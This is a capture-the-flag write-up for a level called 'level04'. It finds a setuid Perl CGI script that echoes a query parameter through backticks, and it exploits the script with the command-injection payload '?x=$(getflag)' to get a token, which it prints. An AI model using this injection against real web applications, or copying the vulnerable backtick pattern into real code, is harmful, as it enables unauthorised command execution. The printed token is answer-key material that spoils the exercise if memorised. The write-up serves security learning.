# level04

## Steps

1. __Observation__ (Guest): when connecting as the `level04` user,
    nothing appears on stdout.

2. __Action__ (Guest): list the files present at the root
    ```sh
    ls -lA
    ```

3. __Observation__ (Guest): the previous command reveals a Perl script
    ```sh
    -rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
    ```
    Just like the previous level, we see that the Set User ID 
    and the Set Group ID are set (allowing us `level04` to run the file 
    like its' owner `flag04`).

4. __Action__ (Guest): run the script
    ```sh
    ./level04.pl
    ```

5. __Observation__ (Guest): nothing much happens, some text is displayed
    on stdout
    ```sh
    Content-type: text/html


    ```

6. __Action__ (Guest): check the content of the file
    ```sh
    cat level04.pl
    ```

7. __Observation__ (Guest): the previous command reveals the content 
    of the file
    ```perl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
        $y = $_[0];
        print `echo $y 2>&1`;
    }
    x(param("x"));
    ```
    - The server is ran on localhost on the port 4747
    - The param is imported from the CGI module
    - The web server is informed the content sent back to the browser is HTML
    - There's a subroutine that takes the first argument given and prints it
    - The parameter passed is stored in a variable named `x`

8. __Action__ (Host): run the web server
    Since we port-forwarded differently, the web server will be run using the
    IP address of our VM. We open our web brower and enter this
    ```sh
    192.168.56.101:4747
    ```

9. __Observation__ (Host): a blank page is showed

10. __Action__ (Host): link the Perl script. we now run the web server
    like this
    ```sh
    192.168.56.101:4747/level04.pl
    ```

11. __Observation__ (Host): the same blank page is showed

12. __Action__ (Host): since the subroutine in `level04.pl` accepts a `x`
    variable, we try passing a value to `x` to see what happens.
    The web server is now run like this
    ```sh
    192.168.56.101:4747?x=test
    ```

13. __Observation__ (Host): test is displayed on the screen

14. __Action__ (Host): invoke the `getflag` command.
    we know that commands are substituted like this in bash `$(command)`
    so this is how we'll run the server
    ```sh
    192.168.56.101:4747?x=$(getflag)
    ```

15. __Observation__ (Host): the following sentence is displayed on the screen
    ```sh
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ```
